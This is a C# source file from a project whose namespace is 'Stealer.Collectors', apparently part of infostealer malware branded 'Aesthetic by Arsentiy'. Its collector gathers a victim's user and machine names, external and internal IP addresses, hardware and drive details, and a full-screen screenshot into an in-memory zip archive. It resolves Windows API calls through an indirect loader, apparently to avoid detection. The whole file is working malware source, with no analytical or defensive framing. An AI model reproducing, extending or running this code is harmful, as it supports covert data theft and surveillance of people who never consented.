using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.Drawing.Text;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;
using Stealer.Utils;

namespace Stealer.Collectors
{
    public class SystemInfoCollector
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool SDPIDelegate();

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr GDWDelegate();

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr GWDCDelegate(IntPtr hWnd);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int RDCDelegate(IntPtr hWnd, IntPtr hDC);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool BBDelegate(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSource, int xSrc, int ySrc, int RasterOp);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int GSMDelegate(int nIndex);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private delegate bool GMSEDelegate(ref MEMORYSTATUSEX lpBuffer);

        private static SDPIDelegate _sdpi;
        private static GDWDelegate _gdw;
        private static GWDCDelegate _gwdc;
        private static RDCDelegate _rdc;
        private static BBDelegate _bb;
        private static GSMDelegate _gsm;
        private static GMSEDelegate _gmse;

        private static SDPIDelegate GetSDPI() { return _sdpi ?? (_sdpi = NativeLoader.Resolve<SDPIDelegate>(NativeLoader.Lib_U32, NativeLoader.Fn_SDPI)); }
        private static GDWDelegate GetGDW() { return _gdw ?? (_gdw = NativeLoader.Resolve<GDWDelegate>(NativeLoader.Lib_U32, NativeLoader.Fn_GDW)); }
        private static GWDCDelegate GetGWDC() { return _gwdc ?? (_gwdc = NativeLoader.Resolve<GWDCDelegate>(NativeLoader.Lib_U32, NativeLoader.Fn_GWDC)); }
        private static RDCDelegate GetRDC() { return _rdc ?? (_rdc = NativeLoader.Resolve<RDCDelegate>(NativeLoader.Lib_U32, NativeLoader.Fn_RDC)); }
        private static BBDelegate GetBB() { return _bb ?? (_bb = NativeLoader.Resolve<BBDelegate>(NativeLoader.Lib_G32, NativeLoader.Fn_BB)); }
        private static GSMDelegate GetGSM() { return _gsm ?? (_gsm = NativeLoader.Resolve<GSMDelegate>(NativeLoader.Lib_U32, NativeLoader.Fn_GSM)); }
        private static GMSEDelegate GetGMSE() { return _gmse ?? (_gmse = NativeLoader.Resolve<GMSEDelegate>(NativeLoader.Lib_K32, NativeLoader.Fn_GMSE)); }

        public static void Collect(InMemoryZip zip)
        {
            try
            {
                StringBuilder sb = new StringBuilder();

                sb.AppendLine("    ___              __  __         __  _     ");
                sb.AppendLine("   /   |  ___  _____/ /_/ /_  ___  / /_(_)____");
                sb.AppendLine("  / /| | / _ \\/ ___/ __/ __ \\/ _ \\/ __/ / ___/");
                sb.AppendLine(" / ___ |/  __(__  ) /_/ / / /  __/ /_/ / /__  ");
                sb.AppendLine("/_/  |_|\\___/____/\\__/_/ /_/\\___/\\__/_/\\___/  ");
                sb.AppendLine("                                               ");
                sb.AppendLine();
                sb.AppendLine("              Aesthetic by Arsentiy");
                sb.AppendLine();

                sb.AppendLine("[User Info]");
                sb.AppendLine($"User: {Environment.UserName}");
                sb.AppendLine($"Machine: {Environment.MachineName}");
                sb.AppendLine($"Now: {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
                sb.AppendLine();

                sb.AppendLine("[Network]");
                sb.AppendLine($"IP: {GetExternalIPAddress()}");
                sb.AppendLine($"Internal IP: {GetLocalIPAddress()}");
                sb.AppendLine($"Default Gateway: {GetDefaultGateway()}");
                sb.AppendLine();

                sb.AppendLine("[System]");
                sb.AppendLine($"OS: {GetWindowsVersionName()}");
                sb.AppendLine($"OS Arch: {(Environment.Is64BitOperatingSystem ? "x64" : "x86")}");
                sb.AppendLine($"CPU Name: {GetCpuName()}");
                sb.AppendLine($"Logical Cores: {Environment.ProcessorCount}");
                sb.AppendLine($"RAM Total (MB): {GetTotalMemoryMB()}");
                sb.AppendLine();

                sb.AppendLine("[Drives]");
                foreach (var drive in DriveInfo.GetDrives().Where(d => d.IsReady))
                {
                    long totalGB = drive.TotalSize / 1024 / 1024 / 1024;
                    long freeGB = drive.TotalFreeSpace / 1024 / 1024 / 1024;
                    sb.AppendLine($"{drive.Name.TrimEnd('\\')} {drive.DriveType} FS:{drive.DriveFormat} Size:{totalGB}GB Free:{freeGB}GB");
                }
                sb.AppendLine();

                sb.AppendLine("[Basic]");
                sb.AppendLine($"User Domain: {Environment.UserDomainName}");
                sb.AppendLine($"CLR Version: {Environment.Version}");

                zip.AddTextFile("Information.txt", sb.ToString());

                CreateScreenshot(zip);
            }
            catch
            {
            }
        }

        private static void CreateScreenshot(InMemoryZip zip)
        {
            try
            {
                try
                {
                    GetSDPI()();
                }
                catch { }

                int screenWidth = GetGSM()(0);
                int screenHeight = GetGSM()(1);

                if (screenWidth == 0 || screenHeight == 0)
                    return;

                using (Bitmap bitmap = new Bitmap(screenWidth, screenHeight, PixelFormat.Format24bppRgb))
                {
                    using (Graphics graphics = Graphics.FromImage(bitmap))
                    {
                        IntPtr hdc = graphics.GetHdc();
                        IntPtr windowDC = GetGWDC()(GetGDW()());
                        GetBB()(hdc, 0, 0, screenWidth, screenHeight, windowDC, 0, 0, 0x00CC0020);
                        graphics.ReleaseHdc(hdc);
                        GetRDC()(GetGDW()(), windowDC);

                        graphics.SmoothingMode = SmoothingMode.AntiAlias;
                        graphics.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
                        graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;

                        RectangleF rect = new RectangleF(0, 0, screenWidth, screenHeight);
                        StringFormat format = new StringFormat
                        {
                            Alignment = StringAlignment.Center,
                            LineAlignment = StringAlignment.Center
                        };

                        float fontSize = Math.Max(24f, screenWidth / 12f);
                        using (Font font = new Font("Arial Black", fontSize, FontStyle.Bold, GraphicsUnit.Pixel))
                        {
                            using (GraphicsPath path = new GraphicsPath())
                            {
                                path.AddString("Aesthetic", font.FontFamily, (int)font.Style, font.Size, rect, format);

                                int shadowLayers = 10;
                                for (int i = shadowLayers; i >= 1; i--)
                                {
                                    int alpha = (int)(30.0 * (1.0 - (double)i / shadowLayers)) + 8;
                                    float width = fontSize / 18f * i;
                                    using (Pen pen = new Pen(Color.FromArgb(alpha, 255, 200, 0), width))
                                    {
                                        pen.LineJoin = LineJoin.Round;
                                        graphics.DrawPath(pen, path);
                                    }
                                }

                                using (LinearGradientBrush brush = new LinearGradientBrush(rect,
                                    Color.FromArgb(255, 255, 215, 0),
                                    Color.FromArgb(255, 255, 255, 255),
                                    LinearGradientMode.Horizontal))
                                {
                                    brush.InterpolationColors = new ColorBlend
                                    {
                                        Colors = new Color[]
                                        {
                                            Color.FromArgb(255, 255, 223, 0),
                                            Color.FromArgb(255, 255, 235, 100),
                                            Color.FromArgb(255, 255, 250, 200),
                                            Color.FromArgb(255, 255, 255, 255)
                                        },
                                        Positions = new float[] { 0f, 0.35f, 0.7f, 1f }
                                    };

                                    graphics.FillPath(brush, path);
                                }

                                using (Pen pen = new Pen(Color.FromArgb(220, 255, 215, 0), Math.Max(2f, fontSize / 28f)))
                                {
                                    pen.LineJoin = LineJoin.Round;
                                    graphics.DrawPath(pen, path);
                                }
                            }
                        }

                        string[] info = new string[]
                        {
                            "Machine: " + Environment.MachineName,
                            "User: " + Environment.UserName,
                            $"Time: {DateTime.Now:yyyy-MM-dd HH:mm:ss}",
                            "OS: " + GetWindowsVersionName(),
                            "CPU: " + GetCpuName(),
                            $"CPU Cores: {Environment.ProcessorCount}",
                            "Aesthetic by Arsentiy"
                        };

                        float infoFontSize = Math.Max(12f, screenWidth / 120f);
                        using (Font infoFont = new Font("Segoe UI", infoFontSize, FontStyle.Regular, GraphicsUnit.Pixel))
                        {
                            float padding = Math.Max(8f, infoFontSize * 0.6f);
                            float maxWidth = 0;
                            float lineHeight = 0;

                            foreach (string line in info)
                            {
                                SizeF size = graphics.MeasureString(line, infoFont);
                                if (size.Width > maxWidth) maxWidth = size.Width;
                                if (size.Height > lineHeight) lineHeight = size.Height;
                            }

                            float panelWidth = maxWidth + padding * 2;
                            float panelHeight = info.Length * lineHeight + padding * 2;
                            RectangleF panel = new RectangleF(12, screenHeight - panelHeight - 12, panelWidth, panelHeight);

                            using (SolidBrush bgBrush = new SolidBrush(Color.FromArgb(180, 6, 6, 10)))
                            using (Pen borderPen = new Pen(Color.FromArgb(220, 60, 60, 80), 1f))
                            {
                                graphics.FillRectangle(bgBrush, panel);
                                graphics.DrawRectangle(borderPen, panel.X, panel.Y, panel.Width, panel.Height);
                            }

                            float textX = panel.X + padding;
                            float textY = panel.Y + padding;

                            using (SolidBrush shadowBrush = new SolidBrush(Color.FromArgb(160, 0, 0, 0)))
                            using (SolidBrush textBrush = new SolidBrush(Color.FromArgb(240, 245, 250, 255)))
                            {
                                foreach (string line in info)
                                {
                                    graphics.DrawString(line, infoFont, shadowBrush, new PointF(textX + 1, textY + 1));
                                    graphics.DrawString(line, infoFont, textBrush, new PointF(textX, textY));
                                    textY += lineHeight;
                                }
                            }
                        }
                    }

                    using (MemoryStream ms = new MemoryStream())
                    {
                        ImageCodecInfo jpegCodec = ImageCodecInfo.GetImageEncoders()
                            .FirstOrDefault(c => c.MimeType.Equals("image/jpeg", StringComparison.OrdinalIgnoreCase));

                        if (jpegCodec != null)
                        {
                            EncoderParameters encoderParams = new EncoderParameters(1);
                            encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 90L);
                            bitmap.Save(ms, jpegCodec, encoderParams);
                        }
                        else
                        {
                            bitmap.Save(ms, ImageFormat.Jpeg);
                        }

                        byte[] imageData = ms.ToArray();
                        if (imageData != null && imageData.Length > 0)
                        {
                            zip.AddFile("screenshot.jpg", imageData);
                        }
                    }
                }
            }
            catch
            {
            }
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        private struct MEMORYSTATUSEX
        {
            public uint dwLength;
            public uint dwMemoryLoad;
            public ulong ullTotalPhys;
            public ulong ullAvailPhys;
            public ulong ullTotalPageFile;
            public ulong ullAvailPageFile;
            public ulong ullTotalVirtual;
            public ulong ullAvailVirtual;
            public ulong ullAvailExtendedVirtual;
        }

        private static long GetTotalMemoryMB()
        {
            try
            {
                MEMORYSTATUSEX status = new MEMORYSTATUSEX();
                status.dwLength = (uint)Marshal.SizeOf(typeof(MEMORYSTATUSEX));
                if (GetGMSE()(ref status))
                {
                    return (long)(status.ullTotalPhys / 1024 / 1024);
                }
            }
            catch { }
            return 0;
        }

        private static string GetLocalIPAddress()
        {
            try
            {
                foreach (var ni in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (ni.OperationalStatus == OperationalStatus.Up &&
                        ni.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                    {
                        foreach (var ip in ni.GetIPProperties().UnicastAddresses)
                        {
                            if (ip.Address.AddressFamily == AddressFamily.InterNetwork)
                            {
                                return ip.Address.ToString();
                            }
                        }
                    }
                }
            }
            catch { }
            return "unavailable";
        }

        private static string GetDefaultGateway()
        {
            try
            {
                foreach (var ni in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (ni.OperationalStatus == OperationalStatus.Up)
                    {
                        foreach (var gateway in ni.GetIPProperties().GatewayAddresses)
                        {
                            if (gateway.Address != null &&
                                gateway.Address.AddressFamily == AddressFamily.InterNetwork)
                            {
                                return gateway.Address.ToString();
                            }
                        }
                    }
                }
            }
            catch { }
            return "unavailable";
        }

        private static string GetCpuName()
        {
            try
            {
                using (var key = Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor\0"))
                {
                    if (key != null)
                    {
                        return key.GetValue("ProcessorNameString")?.ToString()?.Trim() ?? "Unknown";
                    }
                }
            }
            catch { }
            return "Unknown";
        }

        private class TimeoutWebClient : System.Net.WebClient
        {
            protected override System.Net.WebRequest GetWebRequest(Uri address)
            {
                var req = base.GetWebRequest(address);
                if (req != null) req.Timeout = 5000;
                return req;
            }
        }

        private static string GetExternalIPAddress()
        {
            try
            {
                using (var wc = new TimeoutWebClient())
                {
                    return wc.DownloadString("https://api.ipify.org").Trim();
                }
            }
            catch
            {
                try
                {
                    using (var wc = new TimeoutWebClient())
                    {
                        return wc.DownloadString("http://icanhazip.com").Trim();
                    }
                }
                catch { }
            }
            return "unavailable";
        }

        private static string GetWindowsVersionName()
        {
            try
            {
                using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion"))
                {
                    if (key != null)
                    {
                        var productName = key.GetValue("ProductName") as string;
                        var currentBuildStr = key.GetValue("CurrentBuild") as string ?? key.GetValue("CurrentBuildNumber") as string;
                        var editionId = key.GetValue("EditionID") as string;
                        var displayVersion = key.GetValue("DisplayVersion") as string;

                        if (int.TryParse(currentBuildStr, out int build))
                        {
                            if (build >= 22000)
                            {
                                if (productName != null && productName.Contains("Windows 10"))
                                {
                                    productName = productName.Replace("Windows 10", "Windows 11");
                                }
                                else if (productName == null)
                                {
                                    productName = "Windows 11 " + (editionId ?? "Pro");
                                }
                            }
                        }

                        if (!string.IsNullOrEmpty(productName))
                        {
                            if (!string.IsNullOrEmpty(displayVersion))
                            {
                                return $"{productName} ({displayVersion})";
                            }
                            return productName;
                        }
                    }
                }
            }
            catch { }
            return Environment.OSVersion.ToString();
        }
    }
}
